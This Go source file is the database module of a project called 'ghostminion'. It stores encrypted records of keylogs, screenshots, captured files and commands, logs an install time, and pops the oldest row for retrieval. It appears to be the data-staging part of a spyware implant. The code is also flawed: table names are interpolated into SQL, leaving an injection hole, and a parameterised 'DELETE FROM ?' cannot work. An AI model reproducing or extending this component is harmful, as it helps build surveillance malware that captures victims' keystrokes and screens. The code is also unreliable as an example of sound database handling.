package db

import (
	"database/sql"
	"errors"
	"fmt"
	"ghostminion/cryptography"
	_ "modernc.org/sqlite"
	"os"
	"time"
)

const (
	FilesDataType       = "files"
	CommandsDataType    = "commands"
	KeylogsDataType     = "keylogs"
	ScreenshotsDataType = "screenshots"
)

const dbSchemaFilePath = "./db/schema.sql"

var dbInstance *sql.DB

func Init(dbPath string, dbPassword string) error {
	firstInstall := false

	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		firstInstall = true
	}

	err := initDBInstance(dbPath, dbPassword)
	if err != nil {
		return err
	}
	if err = loadSchema(dbInstance); err != nil {
		return err
	}

	if firstInstall {
		_, err = dbInstance.Exec("INSERT INTO metadata (install_time) VALUES (?)", time.Now())
		if err != nil {
			return err
		}
	}

	return nil
}

func initDBInstance(dbPath string, dbPassword string) error {
	connStr := fmt.Sprintf("%s?_pragma_key=%s", dbPath, dbPassword)
	var err error
	dbInstance, err = sql.Open("sqlite", connStr)
	if err != nil {
		return err
	}
	return nil

}

func loadSchema(db *sql.DB) error {
	schema, err := os.ReadFile(dbSchemaFilePath)
	if err != nil {
		return fmt.Errorf("failed to read schema.sql: %v", err)
	}

	tx, err := db.Begin()
	if err != nil {
		return fmt.Errorf("failed to start transaction: %v", err)
	}
	_, err = tx.Exec(string(schema))
	if err != nil {
		err := tx.Rollback()
		if err != nil {
			return err
		}
		return fmt.Errorf("failed to execute schema: %v", err)
	}

	return tx.Commit()

}

func ReadOldestDataRow(table string) (map[string]interface{}, error) {
	rawQuery := "SELECT * FROM %s WHERE save_time = (SELECT MIN(save_time) FROM %s) LIMIT 1"
	query := fmt.Sprintf(rawQuery, table, table)
	row := dbInstance.QueryRow(query)

	columns, err := dbInstance.Query(fmt.Sprintf("PRAGMA table_info(%s)", table))
	if err != nil {
		return nil, err
	}
	defer columns.Close()

	var colNames []string
	for columns.Next() {
		var cid int
		var name string
		var typ string
		var notnull, defaultValue, pk interface{}
		if err := columns.Scan(&cid, &name, &typ, &notnull, &defaultValue, &pk); err != nil {
			return nil, err
		}
		colNames = append(colNames, name)
	}

	colValues := make([]interface{}, len(colNames))
	colPointers := make([]interface{}, len(colNames))
	for i := range colValues {
		colPointers[i] = &colValues[i]
	}

	err = row.Scan(colPointers...)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return nil, nil // No data
		}
		return nil, err
	}

	result := make(map[string]interface{})
	for i, colName := range colNames {
		result[colName] = colValues[i]
	}

	if requestID, exists := result["request_id"].(string); exists {
		err = RemoveOneRow(table, requestID)
		if err != nil {
			return nil, err
		}
	}

	return result, nil
}

func RemoveOneRow(table string, requestID string) error {
	// remove by id and not request id
	_, err := dbInstance.Exec("DELETE FROM ? WHERE request_id = ?", table, requestID)
	return err
}

func WriteDataRow(requestID string, dataType string, data []byte) error {
	data, err := cryptography.EncryptData(data)
	if err != nil {
		return err
	}
	query := "INSERT INTO data (request_id, data, data_type) VALUES (?, ?, ?)"
	_, err = dbInstance.Exec(query, requestID, data, dataType)
	return err
}

func WriteLogRow(level string, message []byte) error {
	message, err := cryptography.EncryptData(message)
	if err != nil {
		return err
	}
	_, err = dbInstance.Exec("INSERT INTO logs (message, level) VALUES (?, ?)", message, level)
	return err
}
